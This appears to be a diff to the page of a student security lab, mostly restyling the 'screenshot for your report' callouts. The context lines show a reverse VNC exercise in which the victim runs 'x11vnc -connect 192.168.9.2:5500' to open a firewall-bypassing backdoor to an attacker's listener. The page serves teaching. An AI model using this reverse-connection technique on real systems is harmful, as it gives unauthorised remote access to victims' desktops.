@@ -182,8 +182,15 @@
   }
 
   /* ---- screenshot + evidence (added) ---- */
-  .call.capture{border-color:var(--violet);background:var(--violet-soft)}
-  .call.capture .k{color:var(--violet)}
+  /* screenshot marker — deliberately loud so students never miss a capture */
+  .call.capture{border:2px dashed var(--violet);background:var(--violet-soft);border-radius:var(--radius-sm);
+    padding:.9rem 1rem .9rem 3.1rem;position:relative}
+  .call.capture::before{content:"\1F4F8";position:absolute;left:.85rem;top:.82rem;font-size:1.5rem;line-height:1}
+  .call.capture .k{display:inline-block;color:var(--bg);background:var(--violet);
+    font-size:.72rem;font-weight:800;letter-spacing:.04em;padding:.22rem .6rem;border-radius:999px;
+    margin:0 0 .45rem;box-shadow:0 1px 2px rgba(0,0,0,.18)}
+  .call.capture p{color:var(--ink);margin:0}
+  html[data-present="on"] .call.capture{padding-top:1rem;padding-bottom:1rem}
   .evidence{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:1rem 1.15rem}
   .evidence ul{list-style:none;margin:.3rem 0 0;padding:0}
   .evidence li{display:flex;gap:.65rem;align-items:flex-start;padding:.5rem 0;border-bottom:1px dotted var(--border);font-size:.92rem}
@@ -316,7 +323,7 @@
       <h3><span class="n">2</span> Connect with a viewer</h3>
       <div class="cmd"><pre><span class="p">root@kali:~#</span> vncviewer</pre></div>
       <p>Point the viewer at <code class="inl">HOST:2</code> (or <code class="inl">HOST:5902</code>) and you're looking at that desktop. In the forward direction, the viewer connects <em>to</em> the server — which means the server's port has to be reachable through any firewall.</p>
-      <div class="call capture"><span class="k">📸 Screenshot for your report</span><p>Capture the viewer showing the remote desktop over a normal VNC connection.</p></div>
+      <div class="call capture"><span class="k">Screenshot for your report</span><p>Capture the viewer showing the remote desktop over a normal VNC connection.</p></div>
     </div>
 
     <p class="task-head">Task 2 — Reverse VNC</p>
@@ -328,7 +335,7 @@
       <div class="cmd"><pre><span class="p">osboxes:~ #</span> cd /usr/bin
 <span class="p">osboxes:~ #</span> ./x11vnc <span class="fl">-connect</span> <span class="ar">192.168.9.2:5500</span></pre></div>
       <p>Because the victim initiates the <em>outbound</em> connection to <code class="inl">192.168.9.2:5500</code>, it bypasses firewall rules that would have blocked an inbound viewer — the reverse-connection trick again. That's what turns remote-admin software into a stealthy backdoor: the attacker's listener sits outside the firewall and the victim inside dials out to it.</p>
-      <div class="call capture"><span class="k">📸 Screenshot for your report</span><p>Capture the reverse connection established — the attacker's listening viewer receiving the victim's desktop.</p></div>
+      <div class="call capture"><span class="k">Screenshot for your report</span><p>Capture the reverse connection established — the attacker's listening viewer receiving the victim's desktop.</p></div>
     </div>
     <div class="done-row"><input type="checkbox" id="done-walkthrough" data-done="walkthrough"><label for="done-walkthrough">Mark this section reviewed</label></div>
   </section>
